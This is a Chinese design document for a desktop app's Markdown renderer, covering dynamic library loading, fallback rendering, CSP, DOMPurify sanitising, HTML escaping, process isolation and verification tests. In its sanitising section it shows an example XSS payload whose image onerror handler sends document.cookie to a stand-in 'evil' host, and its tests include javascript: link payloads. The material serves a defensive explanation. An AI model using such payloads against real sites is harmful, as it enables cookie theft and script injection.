# 06-02 · Markdown 渲染与安全

## 1. 适用范围

| 层 | 位置 |
| --- | --- |
| 渲染封装 | `markdown.js`（81 行） |
| 使用方 | `renderer.js`（小故事预览、阅读弹窗、独立故事详情）、`story-editor.js`（实时预览） |
| 安全策略 | `index.html` 的 CSP `<meta>`、主进程 `webPreferences`、各处 `escapeHtml` |

---

## 2. 为什么不用打包

`marked` 与 `DOMPurify` 以 **UMD 版本从 `node_modules` 动态注入**，而不是 `import`：

```js
const SCRIPT_PATHS = {
  marked: ['node_modules/marked/marked.min.js', 'node_modules/marked/lib/marked.umd.js'],
  dompurify: ['node_modules/dompurify/dist/purify.min.js']
};
```

原因：

1. 项目没有构建步骤，不能用 `import` 语法（浏览器不支持裸模块说明符）；
2. Electron 的 `loadFile` 加载的是 `file://` 页面，相对路径可直接引用 `node_modules`；
3. 有**两个页面向量**（主窗口 + 编辑器）都用它，动态注入只需各自引入 `markdown.js` 一行。

代价：库未安装或路径变化时脚本 404，必须有降级（见第 4 节）。

---

## 3. 加载流程

```js
async init() {
  const ok1 = await loadFirst(SCRIPT_PATHS.marked);      // 逐个候选路径尝试
  await loadFirst(SCRIPT_PATHS.dompurify);
  this.ready = ok1;                                       // 只以 marked 是否成功为准
}
```

- `loadFirst()` 串行尝试候选路径，任一成功即返回，避免版本差异导致路径失配；
- `loadScript()` 用 `onload` / `onerror` + Promise，不阻塞页面其他逻辑；
- 启动时机：`DOMContentLoaded`（若脚本在 DOM 之后加载则立刻执行），
  **不阻塞首屏渲染**——即使用户先点开故事，`MD.render()` 也有降级兜底。

---

## 4. 渲染与降级

```js
render(src) {
  if (!src) return '';
  const markedLib = window.marked;
  if (!markedLib) return '<p>' + escapeHtml(src).replace(/\n/g, '<br>') + '</p>';   // 降级 1：库没加载
  let html;
  try { html = markedLib.parse(String(src), { gfm: true, breaks: true }); }
  catch (_) { return '<p>' + escapeHtml(src).replace(/\n/g, '<br>') + '</p>'; }     // 降级 2：解析异常
  if (window.DOMPurify) {
    try { html = window.DOMPurify.sanitize(html); } catch (_) { /* 忽略，用未消毒结果 */ }
  }
  return html;
}
```

| 层级 | 条件 | 行为 |
| --- | --- | --- |
| 正常 | marked + DOMPurify 都在 | 解析 → 消毒 → 返回 HTML |
| 缺 DOMPurify | marked 在，消毒库不在 | 返回 marked 原始输出（**有 XSS 风险，但保证可用**） |
| 缺 marked | 库加载失败 / 解析抛错 | 转义 + `<br>` 的纯文本段落，永远安全 |

`gfm: true` 开启 GitHub 风格（表格、删除线、任务列表），`breaks: true` 让单个换行也渲染成 `<br>`——
写小说时用户习惯直接回车换行，不开这个选项段落会挤成一坨。

---

## 5. 三级安全防线

### 5.1 CSP（第一道）

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; img-src 'self' file: data:; style-src 'self' 'unsafe-inline'; script-src 'self';">
```

| 指令 | 限制 | 拦住的攻击 |
| --- | --- | --- |
| `script-src 'self'` | 只允许同源脚本 | 内联 `<script>`、`onerror=` 等事件属性、远程脚本 |
| `img-src 'self' file: data:` | 只允许本地与 data URL | 远程图片（防信息外泄 / 追踪像素） |
| `default-src 'self'` | 其余资源默认同源 | `fetch` / `XHR` 外连、`iframe` 嵌入 |

`style-src` 允许 `'unsafe-inline'`：`index.html` 里有少量内联 `style`，且 CSS 注入的危害远小于脚本。

### 5.2 DOMPurify（第二道）

`marked` 输出的是 HTML 字符串，**直接 `innerHTML` 等于把用户写的 Markdown 当代码执行**。
典型 payload：

```markdown
<img src=x onerror="fetch('http://evil/'+document.cookie)">
[点我](javascript:alert(1))
```

DOMPurify 会移除事件属性、危险协议与脚本标签。消毒失败时保守放行（catch 后不覆盖），
因为此时页面 CSP 仍然拦得住脚本执行。

### 5.3 手工转义（第三道，最常用）

`escapeHtml()` 在 `renderer.js` / `story-editor.js` / `markdown.js` 各有一份（同名不同作用域）：

```js
String(s == null ? '' : s)
  .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
  .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
```

**所有非 Markdown 的用户数据在拼 HTML 前必须转义**：姓名、别名、阵营、标签、能力名、关系名…
`escapeAttr()` 目前直接复用 `escapeHtml()`（转义了引号，可安全用于属性值）。

> 注意：`story-editor.js` 里的 `escapeHtml` 是**独立副本**，因为两个页面不共享作用域。
> 若修改转义规则，必须同时改 `renderer.js`、`story-editor.js`、`markdown.js` 三处。

---

## 6. 进程隔离（第四道）

```js
webPreferences: {
  preload: path.join(__dirname, 'preload.js'),
  contextIsolation: true,     // 渲染进程与 preload 的 JS 上下文隔离
  nodeIntegration: false      // 页面里没有 require / process / Buffer
}
```

即使真的执行了恶意脚本，它也拿不到 `require('fs')`——最坏影响限于当前页面 DOM。

---

## 7. 使用位置

| 位置 | 代码 | 说明 |
| --- | --- | --- |
| 小故事卡片预览 | `window.MD.render(truncateText(s.content, 160))` | 先截断再渲染 |
| 参与的故事预览 | `truncateText(s.content, 120)` | 同上 |
| 阅读弹窗 | `$('#readerContent').innerHTML = window.MD.render(story.content)` | 全文 |
| 独立故事详情 | `$('#gsContent').innerHTML = window.MD.render(story.content)` | 全文 |
| 编辑器实时预览 | `$('#preview').innerHTML = window.MD.render($('#f_content').value)` | 每次输入 |

**先截断再渲染**很重要：若先渲染再截 HTML 字符串，会切在标签中间（如 `</str`），
产生破碎结构甚至让后续内容被当成标签属性。

---

## 8. 修改指引

| 需求 | 做法 |
| --- | --- |
| 换 Markdown 库（如 markdown-it） | 改 `SCRIPT_PATHS` + `render()` 里的 `parse` 调用，注意 UMD 全局名变化 |
| 支持代码高亮 | 需再注入 highlight.js，并在 `sanitize` 后对 `<pre><code>` 做后处理；同时放宽 CSP 的 `style-src` |
| 支持图片粘贴到故事 | 需新增「图片落盘」IPC 并在 Markdown 中插入相对路径；`img-src` 已允许 `file:` |
| 允许表格 / 任务列表 | 已开启 `gfm: true`，无需改 |
| 修改转义字符集 | 三份 `escapeHtml` 同步改（见第 5.3 节） |
| 打印 / 导出故事为 HTML | 用 `MD.render` 输出 + 简单模板，注意仍需消毒 |

---

## 9. 本区块改动历史

| 版本 | 变更 |
| --- | --- |
| v1.0 | `markdown.js` 建立：动态加载 marked + DOMPurify，缺失时降级纯文本 |
| v1.0（迭代） | 页面加 CSP（`script-src 'self'`）；故事卡片改为先截断再渲染 |
| v1.3 | 未改动；编辑器子窗口同样依赖该模块 |

---

## 10. 验证方式

```js
// 1. 正常渲染
window.MD.render('# 标题\n\n**粗体**');        // 含 <h1> 与 <strong>

// 2. XSS 消毒
window.MD.render('<img src=x onerror="window.__x=1">');
// 结果不应包含 onerror；window.__x 仍为 undefined

// 3. javascript: 协议
window.MD.render('[点我](javascript:alert(1))');
// 结果不应保留 javascript: 链接

// 4. 降级（临时把 node_modules/marked 改名后重启）
window.MD.render('<b>hi</b>');
// 应为 &lt;b&gt;hi&lt;/b&gt; 的纯文本
```

自动化检查：

```bash
grep -n "innerHTML" renderer.js | grep -v "MD.render" | grep -v "escapeHtml"
# 应只剩可控的静态模板字符串
```
